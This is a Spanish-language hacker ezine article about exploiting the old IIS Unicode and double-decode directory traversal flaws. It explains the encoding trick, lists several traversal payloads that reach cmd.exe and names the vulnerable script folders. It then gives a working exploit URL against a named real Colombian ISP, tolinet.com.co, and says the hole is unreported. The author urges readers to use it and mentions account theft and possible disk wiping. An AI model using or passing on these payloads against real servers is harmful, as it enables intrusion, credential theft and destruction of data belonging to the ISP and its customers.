<<TOLINET>>>

Uds ya conoceran este ISP... bueno si es que se han leido el anterior zine o solo si viven en el TOLIMITA carajo
aki como vivo ejemplo mi prooveedor de internet mas querido...
a ver.. todo lo que les he dicho hasta ahora de este ISP jamas ha sido reportado asi que seguramente encontraran abierto el boyo,,, apenas pa practicar... que mejor que un server que proporciona internet a mas de 500 mil personas...
:DDDz

Disclaimer
No me hago responsable de atentados terroristas contra la sede de Tolinet... that's all 

Hace un tiempillo cuando los niñatos con troyanos invadian el mundo pues se encontro el hoyo de internet mas famoso de todos.. el de escalar directorios "../"en los servidores IIS, inmediatamente se cambiaron las armas y multiples exploits aparecieron, primero para sistemas *x: IIS-zang.c, iis-zang.exe, IISuni.c, unicodecheck.pl y luego los de win32: IIStorm, url scan- ner, Unisploit, Porongator, Fuckserver
Los niños dejan los troyanos a un lado para jugar con los IIS decian las webs jejeje
Esta vulnerabilidad de servidores IIS nos permitia listar directorios, crear carpetas, se podia ejecutar cualquier comando remoto en el servidor con permisos de usuario administrador.
el problema se basa en la sustitución de los caracteres "/" y ".." por su representación UNICODE lo que culmina en salirnos del arbol web y escalar directorios hasta alcanzar el interprete de comandos en winnt/system32, quiero decir que dependerá del tipo de fuentes instaladas en el servidor. Así por ejemplo una construcción valida para determinados servidores, con la que se lograría un dir del directorio raíz, sería: 

http://servidorISSdemierda/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\

dependiendo de los tipos de fuentes.. serian validas estas otras

%c0%af, %c1%9c, %c0%qf, %c1%8s, %c1%9c y %c1%pc

y este siendo solamente el problemilla unicode

el decode se basa en una doble codificacion de la escalada de directorios lo que deja acceso a los directorios

este es un texto q explica claramente la codificacion de los caracteres.. no me acuerdo de dnd lo saque asi que

-----------------------------------------------

Esta vulnerabilidad es muy parecida a la del "IIS Unicode" . Al igual que en la del 
Unicode, utiliza una variación del conocido ataque del ".." de escalar directorios. 
Los servidores mas antiguos ya eran vulnerables a este ataque, porque en la URL 
se permitía escalar directorios hasta fuera del web root utilizando el ".." (similar al 
cd.. utilizado en Ms-Dos), esto permitía al atacante llegar hasta el directorio del 
sistema y poder ejecutar así comandos desde el navegador.

IIS y la mayoría de los servidores de web han incorporado filtros de seguridad que 
niegan cualquier URL que contenga un encabezado demasiado largo o los 
caracteres "..". La vulnerabilidad de Unicode fue el resultado de hacer un manejo 
impropio de la codificación Unicode de los caracteres ".." y "/". 

Esta nueva vulnerabilidad explota otro defecto en el mecanismo de codificación 
del IIS que permite un resultado similar.

Cuando el IIS recibe una petición desde el mismo server, éste lleva a cabo la 
decodificación y continua con la petición, la cadena (petición) es decodificada y 
pasa múltiples chequeos de seguridad para asegurarse de que dicha cadena es 
válida. Una segunda rutina de decodificación es ejecutada para analizar los 
parámetros siguientes al nombre del fichero. El IIS equivocadamente analiza otra 
vez el nombre del fichero con los parámetro adicionales. Este fallo es el que 
permite crear peticiones que incluyan los ".." y "/" saltándose los filtros de 
seguridad.

Todas las peticiones son procesadas desde el contexto del usuario 
IUSR_NombreDeMáquina que pertenece al grupo "Usuarios". Esto permite 
manipular cualquier archivo y ejecutar programas que no sean propiedad de un 
usuario con permisos de Administrador, es decir se accede a PC víctima con 
permisos de usuario.

Esto permite por lo tanto al atacante modificar la página web, bajarse archivos 
importantes o instalar algún programa para controlar remotamente el PC.

Cuando se carga un CGI ejecutable, IIS lo va a decodificar 2 veces. Primero va a 
decodificar el nombre del archivo CGI para ver si es un ejecutable (*.exe, *.com ), 
una vez pasado el primer filtro, IIS va a decodificarlo otra vez, normalmente sólo 
debería decodificar, esta vez, los parámetros del CGI, pero he aquí el error de IIS, 
que decodificará otra vez el nombre del archivo.

Entonces, si al CGI le damos un nombre mal intencionado, que contenga "../" por 
ejemplo, estor caracteres van a pasar el primer filtro y van a ser decodificados 
después una vez mas.

Por ejemplo, en carácter "\" se codifica como "%5c" y a su vez estos de codifican 
como:

'%' = %25
'5' = %35
'c' = %63

codificando una vez mas los tres caracteres de uno en uno se puede obtener los 
siguientes resultados: 

%5c -- %255c

%5c -- %%35c

%5c -- %5%63

%5c -- %%35%63

...

%5c -- %25%35%63

Por lo tanto vemos que "\" puede ser representado por "..%255c" y "..%%35c",etc.

Después de la primera decodificación "..%255c" es transformado a "..%5c", IIS lo 
va a tomar como una cadena segura y pasará por tanto el primer filtro, pero 
después de la segunda decodificación ( la que no debería llevar a cabo el IIS ) la 
cadena quedará "..\", que será perfectamente interpretada y ejecutada puesto que 
ha pasado el filtro de seguridad.

Por tanto una vez que podemos hacer que el IIS acepte la cadena "..\", (similar 
para lo que pretendemos a "../" ) ya podemos escalar directorios como en los 
antiguos servidores web, y podemos por lo tanto ir hasta la carpeta del sistema, 
ejecutar el cmd.exe (emulador de ms-dos) y darle los comandos que queramos.

Aquí tienes una listas del resto de los códigos ASCII Hexadecimales

00 NUL 01 SOH 02 STX 03 ETX 04 EOT 05 ENQ 06 ACK 07 BEL 
08 BS 09 HT 0A NL 0B VT 0C NP 0D CR 0E SO 0F SI 
10 DLE 11 DC1 12 DC2 13 DC3 14 DC4 15 NAK 16 SYN 17 ETB 
18 CAN 19 EM 1A SUB 1B ESC 1C FS 1D GS 1E RS 1F US 
20 SP 21 ! 22 " 23 # 24 $ 25 % 26 & 27 ' 
28 ( 29 ) 2A * 2B + 2C , 2D - 2E . 2F / 
30 0 31 1 32 2 33 3 34 4 35 5 36 6 37 7 
38 8 39 9 3A : 3B ; 3C 3D = 3E 3F ? 
40 @ 41 A 42 B 43 C 44 D 45 E 46 F 47 G 
48 H 49 I 4A J 4B K 4C L 4D M 4E N 4F O 
50 P 51 Q 52 R 53 S 54 T 55 U 56 V 57 W 
58 X 59 Y 5A Z 5B [ 5C \ 5D ] 5E ^ 5F _ 
60 ` 61 a 62 b 63c 64 d 65 e 66 f 67 g 
68 h 69 i 6A j 6B k 6C l 6D m 6E n 6F o 
70 p 71 q 72 r 73 s 74 t 75 u 76 v 77 w 
78 x 79 y 7A z 7B { 7C | 7D } 7E ~ 7F DEL 

El modo de explotar este bug es muy similar al del unicode.

Debido a las diferentes configuraciones que puede tener uno u otro PC, existen 
numerosas variables de códigos, por ejemplo, no sólo la carpeta scripts es 
susceptible de ser explotada en este falla, estas son algunas otras de las 
posibles carpetas: 

MSADC, msadc, PBServer, Rpc, _vti_bin, cgi-bin, adsamples, iisadmpwd, 
samples, scripts

y éstas algunas de las posibles codificaciones que pueden funcionar:

..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir+c:\ ..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir+c:\ ..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/
cmd.exe?/c+dir+c:\ ..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+
dir+c:\ ..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\ ..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:\

----------------------------------------------------------
bueno..

Con el ezine hay un texto muy auto explicativo de como aprovecharse de la vulnerabilidad
subir y bajar archivos etc...  download


http://www.tolinet.com.co/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\

esta url seguramente cuando leas esto.. si es q alguien no le ha formateado el disco al servidor funcionara muy bien para acceder a c:\

no, no en serio, mi interés no es destruir.. = no creo q este servidor pierda mas que el robo de unas cuantas cuentas y si alguien es tan perro para hacer lo anteriormente dicho pues un par de dias de configuración

va pues les dejo un hoyo abierto y las herramientas para explotarlo..
aprovechen!  escribiria varios experimentos con este servidor pero no merece la pena
solo te digo que si pruebas con varios comandos dado a que el servidor no es IIS 4 ni el 5 es el 3 y maneja http 1.0 no el 1.1 a veces te enviara un archivo con la configuración completa del dominio y te quedara con un nombre como cmd.log
ahi dejo el cmd.log de tolinet al final de este texto o con el ezine
bueno ya esta si alguien de mi tierrita esta interesado en meterse un poco mas en este ISP un email estaria bien.. mi problema es que ya no vivo alli y bueno
bah
 suerte

cAd